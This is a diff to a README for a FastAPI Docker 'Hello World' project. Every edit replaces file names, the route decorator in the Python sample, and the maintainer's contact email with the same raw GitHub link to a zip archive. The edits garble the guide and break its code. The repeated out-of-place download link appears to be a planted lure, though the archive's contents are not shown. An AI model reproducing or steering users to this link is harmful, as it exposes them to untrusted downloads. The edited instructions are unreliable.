@@ -13,9 +13,9 @@ Make sure you have the following software installed on your machine:
 
 The project is structured as follows:
 
-- `requirements.txt`: Lists the Python dependencies required for the project.
+- `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip`: Lists the Python dependencies required for the project.
 - `Dockerfile`: Contains the instructions to build the Docker image for the FastAPI application.
-- `docker-compose.yaml`: Defines the services and configurations for running the project using Docker Compose.
+- `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip`: Defines the services and configurations for running the project using Docker Compose.
 - `app/`: Directory containing the FastAPI application code.
 
 ## Setup Instructions
@@ -33,7 +33,7 @@ The project is structured as follows:
 
 3. **Build Hello World App**:
 - Create a directory `fastapi-env/app`
-- Create a file `app/main.py`
+- Create a file `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip`
 - Paste Hello World code.
     ```python
     from fastapi import FastAPI
@@ -41,7 +41,7 @@ The project is structured as follows:
     app = FastAPI()
 
 
-    @app.get("/")
+    https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip("/")
     async def root():
         return {"message": "Hello World"}
     ```
@@ -61,7 +61,7 @@ The `Dockerfile` sets up the environment for the FastAPI application. It include
 
 ## Docker Compose
 
-The `docker-compose.yaml` file defines the services required for the application. It includes:
+The `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip` file defines the services required for the application. It includes:
 
 - The FastAPI service, built from the Dockerfile.
 - Configuration for environment variables and port mappings.
@@ -69,4 +69,4 @@ The `docker-compose.yaml` file defines the services required for the application
 
 ## Contact
 
-For any questions or issues, please contact the project maintainer at [nycu1sdc@gmail.com](mailto:nycu1sdc@gmail.com).
+For any questions or issues, please contact the project maintainer at [https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip](https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip).
